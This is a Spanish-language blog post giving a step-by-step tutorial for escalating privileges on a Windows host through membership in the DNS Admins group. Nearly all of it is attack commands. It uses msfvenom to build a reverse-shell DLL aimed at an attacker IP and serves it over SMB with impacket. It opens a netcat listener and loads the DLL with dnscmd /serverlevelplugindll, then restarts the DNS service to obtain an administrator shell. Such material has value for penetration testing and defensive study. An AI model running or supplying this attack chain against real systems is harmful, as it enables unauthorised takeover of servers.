+++
date = "2020-04-16"
title = "Escalada de privilegios en Windows mediante grupo Administradores de DNS"
author = "Javier Olmedo"
toc = false
+++

Cuando tomamos el control de una máquina, el siguiente paso es la **escalada de privilegios** para hacernos con el control total de ella. En la siguiente entrada, veremos como conseguirlo aprovechándonos del **grupo de administradores DNS** y la inyección de una dll maliciosa.

## Pasos a seguir

1. Comprobar que el usuario comprometido forma parte del grupo de administradores DNS.

```bash
whoami /all
```

[![/images/escalada-de-privilegios-en-windows-mediante-grupo-administradores-de-dns/escalada-de-privilegios-en-windows-mediante-grupo-administradores-de-dns_001.png](/images/escalada-de-privilegios-en-windows-mediante-grupo-administradores-de-dns/escalada-de-privilegios-en-windows-mediante-grupo-administradores-de-dns_001.png)](/images/escalada-de-privilegios-en-windows-mediante-grupo-administradores-de-dns/escalada-de-privilegios-en-windows-mediante-grupo-administradores-de-dns_001.png)

Comprobación del grupo de administradores DNS

2. **Generar un payload** con una shell reversa mediante el uso de **msfvenom**.

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=[IP-ATACANTE] LPORT=[PUERTO-ATACANTE] --platform=windows -f dll > ~/payloads/plugin.dll
```

[![/images/escalada-de-privilegios-en-windows-mediante-grupo-administradores-de-dns/escalada-de-privilegios-en-windows-mediante-grupo-administradores-de-dns_002.png](/images/escalada-de-privilegios-en-windows-mediante-grupo-administradores-de-dns/escalada-de-privilegios-en-windows-mediante-grupo-administradores-de-dns_002.png)](/images/escalada-de-privilegios-en-windows-mediante-grupo-administradores-de-dns/escalada-de-privilegios-en-windows-mediante-grupo-administradores-de-dns_002.png)

Generación de dll maliciosa con msfvenom

3. Desde la máquina atacante, servir el payload generado en el paso anterior por **SAMBA** mediante el script `smbserver.py`.

```bash
cd /usr/share/doc/python3-impacket/examples
sudo ./smbserver.py HACKPUNTES /home/jolmedo/payloads/
```

[![/images/escalada-de-privilegios-en-windows-mediante-grupo-administradores-de-dns/escalada-de-privilegios-en-windows-mediante-grupo-administradores-de-dns_003.png](/images/escalada-de-privilegios-en-windows-mediante-grupo-administradores-de-dns/escalada-de-privilegios-en-windows-mediante-grupo-administradores-de-dns_003.png)](/images/escalada-de-privilegios-en-windows-mediante-grupo-administradores-de-dns/escalada-de-privilegios-en-windows-mediante-grupo-administradores-de-dns_003.png)

Servicio SAMBA del script smbserver.py

4. En otra terminal, ponemos la máquina atacante a la escucha en el puerto **4444** con **netcat**.

```bash
nc -lvnp 4444
```

5. En la máquina comprometida, **importamos la dll maliciosa** de la siguiente manera.

```bash
dnscmd.exe /config /serverlevelplugindll \\[IP-ATACANTE]\hackpuntes\plugin.dll
```

[![/images/escalada-de-privilegios-en-windows-mediante-grupo-administradores-de-dns/escalada-de-privilegios-en-windows-mediante-grupo-administradores-de-dns_004.png](/images/escalada-de-privilegios-en-windows-mediante-grupo-administradores-de-dns/escalada-de-privilegios-en-windows-mediante-grupo-administradores-de-dns_004.png)](/images/escalada-de-privilegios-en-windows-mediante-grupo-administradores-de-dns/escalada-de-privilegios-en-windows-mediante-grupo-administradores-de-dns_004.png)

Importación de dll maliciosa en equipo comprometido

6. Ultimo paso para conseguir la shell reversa con privilegios, reiniciar el servicio DNS.

```bash
sc.exe stop dns
sc.exe start dns
```

[![/images/escalada-de-privilegios-en-windows-mediante-grupo-administradores-de-dns/escalada-de-privilegios-en-windows-mediante-grupo-administradores-de-dns_005.png](/images/escalada-de-privilegios-en-windows-mediante-grupo-administradores-de-dns/escalada-de-privilegios-en-windows-mediante-grupo-administradores-de-dns_005.png)](/images/escalada-de-privilegios-en-windows-mediante-grupo-administradores-de-dns/escalada-de-privilegios-en-windows-mediante-grupo-administradores-de-dns_005.png)

Shell reversa con permisos de administrador

Hasta la próxima!!